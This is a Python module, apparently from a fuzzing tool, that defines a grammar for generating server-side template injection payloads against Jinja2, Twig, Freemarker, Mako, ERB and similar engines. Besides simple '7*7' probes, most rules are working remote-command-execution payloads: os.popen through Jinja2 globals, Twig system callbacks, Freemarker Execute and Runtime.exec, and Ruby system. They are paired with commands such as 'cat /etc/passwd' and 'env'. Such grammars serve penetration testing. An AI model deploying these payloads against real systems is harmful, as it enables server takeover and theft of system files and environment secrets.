"""SSTI grammar — Jinja2, Twig, Freemarker, Mako, Smarty, ERB, Pebble."""
from .engine import Grammar

SSTI_GRAMMAR = Grammar(
    rules={
        "ssti": [
            ["jinja2"],
            ["twig"],
            ["freemarker"],
            ["mako"],
            ["erb"],
            ["generic_probe"],
        ],
        # --- Jinja2 / Flask ---
        "jinja2": [
            ["{{", "j2_expr", "}}"],
            ["{%", "j2_stmt", "%}"],
        ],
        "j2_expr": [
            ["7*7"],
            ["config"], ["config.items()"],
            ["self.__class__.__mro__"],
            ["request.environ"],
            ["lipsum.__globals__"],
            ["cycler.__init__.__globals__"],
            ["joiner.__init__.__globals__"],
            ["namespace.__init__.__globals__"],
            ["''.__class__.__mro__[1].__subclasses__()"],
            ["''.__class__.__mro__[1].__subclasses__()[", "j2_index", "]"],
            ["().__class__.__bases__[0].__subclasses__()"],
            ["lipsum.__globals__['os'].popen('", "cmd", "').read()"],
            ["''|attr('__class__')|attr('__mro__')"],
            ["config|attr('__class__')"],
            ["request['__class__']"],
            ["g.pop.__globals__.__builtins__.__import__('os').popen('", "cmd", "').read()"],
        ],
        "j2_index": [
            ["40"], ["132"], ["133"], ["140"], ["200"],
            ["213"], ["245"], ["258"], ["273"], ["396"],
        ],
        "j2_stmt": [
            [" set x='__cla'~'ss__' %}{%set y=''|attr(x) %}", "j2_chain"],
            [" for x in ''.__class__.__mro__[1].__subclasses__() %}{{x}}{%endfor%}"],
            [" import os %}{{os.popen('", "cmd", "').read()}}"],
        ],
        "j2_chain": [
            ["{{y}}"], ["{{y.__mro__}}"],
        ],
        "cmd": [
            ["id"], ["whoami"], ["cat /etc/passwd"],
            ["ls"], ["uname -a"], ["env"], ["pwd"],
        ],
        # --- Twig ---
        "twig": [
            ["{{", "twig_expr", "}}"],
        ],
        "twig_expr": [
            ["7*7"], ["7*'7'"],
            ["dump()"], ["app.request.server.getAll()"],
            ["_self.env.getRuntime('system')('", "cmd", "')"],
            ["['system']('", "cmd", "')"],
            ["_self.env.registerUndefinedFilterCallback('exec')"],
            ["_self.env.getFilter('", "cmd", "')"],
        ],
        # --- Freemarker ---
        "freemarker": [
            ["${", "fm_expr", "}"],
            ["<#assign ", "fm_assign", ">", "fm_exec"],
        ],
        "fm_expr": [
            ["7*7"],
            [".data_model.keySet()"],
            [".env"], [".now"], [".version"],
        ],
        "fm_assign": [
            ["ex='freemarker.template.utility.Execute'?new()"],
            ["ob='freemarker.template.utility.ObjectConstructor'?new()"],
        ],
        "fm_exec": [
            ["${ex('", "cmd", "')}"],
            ["${ob('java.lang.Runtime').getRuntime().exec('", "cmd", "')}"],
        ],
        # --- Mako ---
        "mako": [
            ["${", "mako_expr", "}"],
            ["<% import os %>", "${os.popen('", "cmd", "').read()}"],
        ],
        "mako_expr": [
            ["7*7"],
            ["self.module.__loader__.__class__.__module__"],
            ["__import__('os').popen('", "cmd", "').read()"],
        ],
        # --- ERB (Ruby) ---
        "erb": [
            ["<%= ", "erb_expr", " %>"],
        ],
        "erb_expr": [
            ["7*7"], ["system('", "cmd", "')"], ["File.read('/etc/passwd')"],
            ["`", "cmd", "`"],
        ],
        # --- generic probe ---
        "generic_probe": [
            ["{{7*7}}"], ["${7*7}"], ["<%= 7*7 %>"],
            ["#{7*7}"], ["*{7*7}"], ["{{7*'7'}}"],
            ["${T(java.lang.Runtime).getRuntime().exec('", "cmd", "')}"],
            ["{{''.__class__.__mro__}}"],
        ],
    },
    start="ssti",
)
